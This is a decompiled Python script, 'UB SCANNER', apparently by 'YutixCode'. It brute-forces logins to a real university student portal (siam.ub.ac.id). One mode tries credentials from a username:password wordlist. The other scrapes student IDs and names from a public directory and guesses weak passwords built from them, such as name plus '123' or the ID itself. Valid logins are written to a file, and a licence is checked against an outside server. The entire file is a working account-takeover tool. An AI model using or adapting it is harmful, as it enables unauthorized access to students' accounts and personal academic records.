# uncompyle6 version 3.7.4
# Python bytecode 3.8
# Decompiled from: Python 3.8.5 (default, Jul 24 2020, 12:30:11) 
# [Clang 9.0.8 (https://android.googlesource.com/toolchain/llvm-project 98c855489
# Embedded file name: <EzzKun>
import requests as req, requests.packages.urllib3
from bs4 import BeautifulSoup as bs
requests.packages.urllib3.disable_warnings()
import os, time, platform, hashlib
os.system('clear')
grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[37m'
flag = '\x1b[41;39m'
off = '\x1b[m'
ok = []
no = []
rv = platform.uname().release
me = int(hashlib.sha256(rv.encode('utf-8')).hexdigest(), 16) % 100000000
bn = f"\r{flag}UB SCANNER{white}|{green} B {cyan}E {yellow}T {white}A{off}\n"

def acd(usr, pwd):
    url = 'https://siam.ub.ac.id/'
    dat = {'username':usr,  'password':pwd, 
     'login':'submit'}
    raw = req.post(url, data=dat, verify=False, timeout=10).text
    res = bs(raw, 'html.parser').title.get_text()
    if res == 'Sistem Informasi Akademik Mahasiswa':
        print(f"{green}[{yellow}✓{green}]{yellow}{usr}{white}:{green}{pwd}")
        ok.append(f"{usr}:{pwd}")
        with open('ub.txt', 'a') as (s):
            s.write(f"{usr}:{pwd}\n")
    else:
        print(f"{red}[{cyan}×{red}]{cyan}{usr}{white}:{red}{pwd}")
        no.append(f"{usr}:{pwd}")


def done():
    if len(ok) != 0:
        exit(f"\n{purple}[{white}!{purple}]{white}[{green}Live:{len(ok)}{white}]")
       
    else:
        exit(f"\n{purple}[{white}!{purple}]{white}[{red}Scan selesai dengan hasil NIHIL :({white}]")


def main():
    print(bn)
    try:
        akses = req.get(f"http://yutixcode.xyz/akses/ui/{me}", verify=False).status_code
        print(end='')
        if akses != 200:
            print(f"{green}[{white}1{green}]{white}Wordlist scan")
            print(f"{green}[{white}2{green}]{white}Auto scan forlap")
            inv = input(f"{flag}{green}[{white}?{green}]{white}Pilih{off} > ")
            if inv == '1':
                print(f"\n{red}[{white}!{red}]{white}Wordlist berisi {red}username{cyan}:{off}password")
                file = input(f"\r{flag}{green}[{white}?{green}]{white}Input list{off} > ")
                with open(file, 'r') as (f):
                    lines = f.readlines()
                    count = 1
                    print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
                    for line in lines:
                        usr = line.strip().split(':')[0]
                        pwd = line.strip().split(':')[1]
                        acd(usr, pwd)
                        count += 1

            elif inv == '2':
                url = input(f" Link forlap {cyan}>{white} ")
                print()
                raw = req.get(url, verify=False).text
                resp = bs(raw, 'html.parser').find('div', {'id': 'mahasiswa'}).find_all('tr')[1:]
                for i in range(len(resp)):
                    link = resp[i].find('a')['href']
                    stat = req.get(link, verify=False).text
                    tab = bs(stat, 'html.parser').find_all('table')[0].find_all('tr')[3:]
                    for x in range(len(tab)):
                        nim = tab[x].find_all('td')[1].get_text().replace(' ', '')
                        nama = tab[x].find_all('td')[2].get_text().replace(' ', '.').title()
                        try:
                            acd(nim, f"{nama.split('.')[0]}123")
                            acd(nim, f"{nama.split('.')[1]}123")
                            acd(nim, f"{nama.split('.')[2]}123")
                            acd(nim, nim)
                        except:
                            acd(nim, nim)

                else:
                    done()

            else:
                exit(f"\n{purple}[{white}!{purple}]{white}Yang bener masukin inputnya")
        else:
            print(end=f"\r{white} {{!}} Kamu tidak memiliki izin\n {{!}} YourID: {green}{me}\n")
            exit(f"{white} {{!}} Author: {green}YutixCode")
    except KeyboardInterrupt:
        exit(f"\n{purple}[{white}!{purple}]{white}Keluar script")
    except Exception as er:
        try:
            exit(f"\n{white} {{!}} {er}")
        finally:
            er = None
            del er


if __name__ == '__main__':
    main()